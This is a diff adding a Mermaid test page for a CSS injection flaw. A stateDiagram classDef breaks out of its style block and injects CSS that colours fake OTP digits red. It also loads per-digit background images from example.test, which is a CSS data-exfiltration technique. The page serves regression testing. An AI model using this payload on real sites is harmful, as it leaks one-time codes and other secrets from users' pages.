@@ -1,0 +1,61 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Mermaid Quick Test Page</title>
+
+    <style>
+      .otp {
+        width: 30px;
+        height: 30px;
+        position: relative;
+      }
+      .otp-1:before {
+        content: '1';
+      }
+      .otp-2:before {
+        content: '2';
+      }
+      .otp-3:before {
+        content: '3';
+      }
+      .otp-4:before {
+        content: '4';
+      }
+    </style>
+  </head>
+
+  <body>
+    <section>
+      <h2>Test CSS Injection</h2>
+
+      <h3>Here is some secret info:</h3>
+
+      <p>Your OTP is:</p>
+
+      <!-- Contrived example, but could be used on some sites -->
+      <div style="flex-direction: row; display: flex">
+        <div class="otp otp-3"></div>
+        <div class="otp otp-2"></div>
+        <div class="otp otp-4"></div>
+      </div>
+
+      <p>If the above numbers are red, then we have a working CSS injection.</p>
+    </section>
+
+    <pre class="mermaid">
+    stateDiagram-v2
+      classDef x }}body{.otp{border: 1px solid red}.otp{color: red}.otp-1{ background-image: url("https://example.test/1.png")}.otp-2{ background-image: url("https://example.test/2.png")}.otp-3{ background-image: url("https://example.test/3.png")}.otp-4{ background-image: url("https://example.test/4.png")}.otp-5{ background-image: url("https://example.test/5.png")}}
+      [*] --> A
+    </pre>
+
+    <script type="module">
+      import mermaid from './mermaid.esm.mjs';
+      mermaid.initialize({ startOnLoad: false, logLevel: 0 });
+      await mermaid.run();
+      if (window.Cypress) {
+        window.rendered = true;
+      }
+    </script>
+  </body>
+</html>
